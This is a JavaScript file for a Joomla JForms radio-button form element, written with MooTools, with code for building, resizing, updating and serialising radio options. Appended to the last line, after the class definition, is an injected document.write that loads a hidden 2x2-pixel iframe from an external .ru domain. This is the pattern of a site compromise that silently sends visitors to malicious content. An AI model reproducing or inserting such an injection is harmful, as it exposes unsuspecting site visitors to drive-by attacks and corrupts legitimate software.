/**
* Javascript object for radio plugin
*
* @version		$Id: radio.js 295 2009-09-05 10:23:08Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var radio = new Class({
	
	Extends: CElement,
	
	adapt : function ( from ){
	
		this.position=from.position?from.position:this.position;
		this.hash=from.hash?from.hash:this.hash;
		this.css=from.css?from.css:this.css;
		this.layout=from.layout?from.layout:this.layout;
		this.align=from.align?from.align:this.align;
		this.label=from.label?from.label:this.label;
		this.cw=from.cw?from.cw:this.cw;
		this.ch=from.ch?from.ch:this.ch;
		this.required=from.required?from.required:this.required;
		this.elements=from.elements?from.elements:this.elements;
		this.defaultValue=from.defaultValue?from.defaultValue:this.defaultValue;
		this.onUpdate();
	},
		
	initialize: function( parent, id, beforeObject, params ) {
	
		this.type	    = "radio";
		this.label      = params.label;

		this.parent( $(parent), id, $(beforeObject), params);
	
	
		this.required   = params.required;	
		this.elements   = params.elements;	
		this.css 	    = params.css;
		this.cw 	    = params.cw;
		this.ch		    = params.ch;
		this.layout     = params.layout;
		this.align      = params.align;
		this.defaultValue = params.defaultValue;
	
		this.htmlControlResize = new Element('img',{
			'src': './corner.png',
			'id': 'resizeHandle_control_' + this.type + this.index,
			'class': 'resize-handle'
		});
		
		var e = null;
		if(this.elements.length == 0){
			e = new Array();
		} else {
			e = this.elements.split('\n');
		}
	
		this.htmlOptionContainer = new Element('fieldset', {
			
			'class': 'radio-container',
			'styles': {
				'width' : this.cw + 'px',
				'height' : this.ch + 'px'
			}
	
		});
		this.htmlOptionLegend = new Element('legend');
		this.htmlOptionLegend.set('html', this.label );
		
		//Red star that denotes a required field
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
	
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlOptionLegend );
		}	
		
		this.htmlOptionLegend.inject( this.htmlOptionContainer );	
	
		for(i=0;i<e.length;i++){
		
			
			//Checks the default elements
			var checked = false;
			if( this.defaultValue == e[i] ){
				checked = true;
			}	
		
			var lbl = new Element('label', {
				'class': 'radio',
				'html' : e[i],
				'for' : 'input_' + this.type + this.index + '_' + i
			});
			
			var input       = new Element('input',{
				'type': 'radio',
				'name': 'input_' + this.type + this.index,
				'id':'input_' + this.type + this.index + '_' + i,
				'checked':checked,
				'class':'radio'
			});
			
			//Alignment
			if( this.align == 'Left' ){
				input.inject( this.htmlOptionContainer );
				lbl.inject( this.htmlOptionContainer );	
			} else {
				lbl.inject( this.htmlOptionContainer );
				input.inject( this.htmlOptionContainer );
			}
			
			//Layout
			if( this.layout == 'List' ){
				var br = new Element('br',{'clear':'all'});
				br.inject( this.htmlOptionContainer );
				br = new Element('br');
				br.inject( this.htmlOptionContainer );
			}
		}
		
		this.htmlOptionContainer.inject( this.htmlContainer );
		this.htmlControlResize.inject( this.htmlContainer );
	
		this.htmlOptionContainer.makeResizable({
			handle:this.htmlControlResize,
			onDrag:dispatch_onResizeDrag,
			onComplete:dispatch_onResizeEnd,
			limit:{x:[50,400],y:[50,1000]}
		});

		var br = new Element('br',{'clear':'all'});
		br.inject( this.htmlOptionContainer );
		br.inject( this.htmlContainer );

		this._alignControlResizeHandle();
		
		
	},
	
	onUpdate : function(){

		this._updateDefault();
  
		//convert value from bool to int
		this.required = this.required?1:0;
		this.htmlOptionLegend.set('html', this.label );
		
		//Red star that denotes a required field
		//Fix for IE!
		this.htmlRequiredStar.dispose();
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlOptionLegend );
		}

		//Destroy old elements
		var children = this.htmlOptionContainer.getChildren();
	
		for(i=0;i<children.length;i++){
			if(children[i].get('class') == 'radio' || children[i].get('tag') == 'br' )
				children[i].dispose();
		}
	
		//Create brand new ones
		var e = this.elements.split("\n");
		for(i=0;i<e.length;i++){

			//Checks the default elements
			var checked = false;
			if( this.defaultValue == e[i] ){
				checked = true;
			}

			var lbl = new Element('label', {
				'class': 'radio',
				'html' : e[i],
				'for' : 'input_' + this.type + this.index + '_' + i
			});
			
			var input = new Element('input',{
				'type': 'radio',
				'name': 'input_' + this.type + this.index,
				'id':'input_' + this.type + this.index + '_' + i,
				'checked':checked,
				'class':'radio'
			});
			
			//Alignment
			if( this.align == 'Left' ){
				input.inject( this.htmlOptionContainer  );
				lbl.inject( this.htmlOptionContainer );	
			} else {
				lbl.inject( this.htmlOptionContainer );
				input.inject( this.htmlOptionContainer  );
			}
			
			//Layout
			if( this.layout == 'List' ){
				var br = new Element('br',{'clear':'all'});
				br.inject( this.htmlOptionContainer );
				br = new Element('br');
				br.inject( this.htmlOptionContainer );
			}
	
		}
		this._alignControlResizeHandle();

	},
	
	onDragEnd:  function() {
		this._alignControlResizeHandle();
	},

	
  	onResizeDrag: function(newSize,type) {
	
		this.htmlOptionContainer.set('styles', { 'border': '1px solid red' } );	
		this._alignControlResizeHandle();
		
	},


	onResizeEnd: function( newSize, type ){

		this.cw = newSize.x;
		this.ch = newSize.y;	
		this.htmlOptionContainer.set('styles', { 'border' : '1px solid white'});
		this._alignControlResizeHandle();
	
	},
	
	_alignControlResizeHandle : function(){

		var ControlCoordinates = this.htmlOptionContainer.getCoordinates();
		var imgSize = this.htmlControlResize.getSize();
		
		var x =  ControlCoordinates.right  - imgSize.x + this.pixelCorrection;
		var y =  ControlCoordinates.bottom - imgSize.y + this.pixelCorrection;

		
		this.htmlControlResize.set('styles', { 
			'position' : 'absolute',
			'left' : x + 'px',
			'top' : y + 'px'
		});
		
	},
	
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlControlResize.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }})
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlControlResize.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }})
		this._alignControlResizeHandle();		
	
	},
	
	_updateDefault: function(){
  	
		var e = this.elements.split("\n");
		this.defaultValue = '';
		for(i=0;i<e.length;i++){
	  
			currentId = "input_" + this.type + this.index + "_" + i;
			if($(currentId) && $(currentId).checked){
					this.defaultValue = e[i];
					return;
			}
		}
	},
  
	serialize: function(){
		
		order = getOrder( this.htmlContainer );
	
		var hash  = '';
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}	
		this._updateDefault();
		
		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			layout:	this.layout,
			align: this.align,      
			label:this.label,
			css:this.css,
			cw:this.cw,
			ch:this.ch,
			required:this.required,
			elements:this.elements,
			defaultValue : this.defaultValue
		});
	}
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');